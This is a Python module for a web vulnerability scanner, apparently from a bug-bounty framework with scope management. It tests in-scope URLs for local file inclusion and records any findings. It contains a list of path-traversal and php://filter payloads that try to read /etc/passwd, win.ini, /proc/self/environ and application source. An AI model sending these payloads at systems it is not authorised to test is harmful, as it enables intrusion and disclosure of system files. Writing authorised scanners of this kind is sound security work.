"""Local File Inclusion (LFI) testing tool."""

from __future__ import annotations

import aiohttp
from lib_webbh.scope import ScopeManager
from workers.input_validation.base_tool import InputValidationTool
from workers.input_validation.concurrency import WeightClass

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
]


class LocalFileInclusionTester(InputValidationTool):
    """Test for Local File Inclusion vulnerabilities."""

    name = "local_file_inclusion"
    weight_class = WeightClass.LIGHT

    async def execute(
        self,
        target,
        scope_manager: ScopeManager,
        target_id: int,
        container_name: str,
        headers: dict | None = None,
        **kwargs,
    ) -> dict:
        """Execute LFI tests against target URLs."""
        found = 0
        vulnerable = 0

        urls = await self._get_all_url_assets(target_id)

        for asset_id, url in urls:
            for payload in LFI_PAYLOADS:
                test_url = f"{url}?file={payload}"
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(test_url, headers=headers, timeout=10) as resp:
                            response_text = await resp.text()
                            if self.detect_vulnerability(response_text, "lfi"):
                                await self._save_vulnerability(
                                    target_id=target_id,
                                    asset_id=asset_id,
                                    severity="high",
                                    title="Local File Inclusion Vulnerability",
                                    description=f"LFI found at {url} with payload: {payload}",
                                    poc=test_url,
                                )
                                vulnerable += 1
                                break
                except Exception:
                    continue
            found += 1

        return {"found": found, "vulnerable": vulnerable}
